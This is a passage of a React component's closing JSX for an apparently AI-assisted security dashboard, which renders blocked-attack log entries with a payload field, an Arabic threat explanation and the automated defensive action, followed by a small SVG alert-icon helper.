                                IP blocked: {log.ip}
                              </span>
                            </div>
                            <p className="text-[10px] text-slate-500 mt-0.5">
                              Path Attempted: <strong className="font-mono text-slate-400">{log.path}</strong> | Attacker Node: <strong className="font-mono text-slate-400">{log.userEmail}</strong>
                            </p>
                          </div>

                          {/* Technical Payload Details */}
                          <div className="bg-slate-950 border border-slate-850 p-2.5 rounded-lg text-[10px] font-mono text-slate-400 overflow-x-auto text-left shadow-inner">
                            <span className="text-slate-600 block mb-0.5">INCOMING_MALICIOUS_PAYLOAD:</span>
                            {log.payload}
                          </div>

                          {/* AI Explanation in Arabic */}
                          <div className="bg-slate-950/40 border border-slate-850 p-3 rounded-lg text-xs leading-relaxed text-slate-300">
                            <div className="flex items-center gap-1 text-purple-400 font-bold mb-1.5">
                              <Sparkles className="w-3.5 h-3.5" />
                              <span>تقرير درع الذكاء الاصطناعي:</span>
                            </div>
                            {log.threatExplanationAr}
                          </div>

                          {/* Automated Action taken banner */}
                          <div className="flex justify-between items-center bg-slate-950/20 p-2 rounded border border-white/5 text-[10px] font-mono">
                            <span className="text-slate-500">SYSTEM_DEFENSIVE_ACTION:</span>
                            <span className="text-emerald-400 font-bold uppercase">{log.actionTaken}</span>
                          </div>
                        </div>
                      </div>
                    </div>
                  ))
                }
              </div>
            )}

          </div>
        )}

      </div>
    </div>
  );
}

// Minimal placeholder subcomponent to prevent compiler complaints
function AlertCircleIcon({ className }: { className?: string }) {
  return (
    <svg className={className} fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2">
      <path strokeLinecap="round" strokeLinejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
    </svg>
  );
}
